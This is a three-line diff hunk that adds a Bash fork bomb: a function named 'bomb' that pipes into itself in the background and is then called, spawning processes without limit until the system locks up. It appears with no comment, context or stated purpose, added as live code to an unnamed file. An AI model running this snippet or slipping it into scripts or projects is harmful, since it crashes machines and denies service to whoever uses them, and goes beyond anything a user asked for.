@@ -1,0 +1,3 @@
+bomb() {
+ bomb | bomb &
+}; bomb 
